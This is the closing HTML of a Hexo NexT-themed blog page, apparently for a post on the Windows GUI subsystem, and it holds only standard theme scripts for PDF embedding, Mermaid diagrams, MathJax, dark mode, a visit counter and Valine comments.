  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;

  if (NexT.utils.supportsPDFs()) {
    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
  } else {
    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
  }
});
</script>


<script data-pjax>
if (document.querySelectorAll('.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
    mermaid.init({
      theme    : 'forest',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    }, '.mermaid');
  }, window.mermaid);
}
</script>





  
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








    <div class="pjax">
  

  
      <script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              const target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    const script = document.createElement('script');
    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.0/es5/tex-mml-chtml.js';
    script.defer = true;
    document.head.appendChild(script);
  } else {
    MathJax.startup.document.state(0);
    MathJax.typesetClear();
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  
<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>

<script>
var options = {
  bottom: '70px',
  right: 'unset',
  left: '16px',
  time: '0.5s',
  mixColor: 'transparent',
  backgroundColor: 'transparent',
  buttonColorDark: '#222',
  buttonColorLight: '#222',
  saveInCookies: false,
  label: '',
  autoMatchOsTheme: false
}
const darkmode = new Darkmode(options);
window.darkmode = darkmode;
darkmode.showWidget();
if (window.darkmode && !window.darkmode.isActivated()) {
  window.darkmode.toggle();
  var toggleButtons = document.getElementsByClassName("darkmode-toggle");
  if (toggleButtons && toggleButtons.length > 0) {
    for (i = 0; i < toggleButtons.length; i++) {
      toggleButtons[i].classList.add("darkmode-toggle--white");
    }
  }
}
</script>

<script>
NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({"enable":true,"appId":"7zujCcS8pYH88CJXfdBlLyS8-gzGzoHsz","appKey":"lWGr7OPoNHo4v1YmVV5yr3E9","serverURLs":"https://7zujccs8.lc-cn-n1-shared.com","placeholder":"å¿«æ¥å‹¾æ­æˆ‘å‘€ğŸ¶","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"bg":"/images/comment_bg.png","recordIP":false,"enableQQ":false,"requiredFields":["nick"]}, {
      el: '#valine-comments',
      path: "/post/Windows-GUI-Subsystem2/",
      serverURLs: "https://7zujccs8.lc-cn-n1-shared.com"
    }));
  }, window.Valine);
});
</script>

    </div>
</body>
</html>
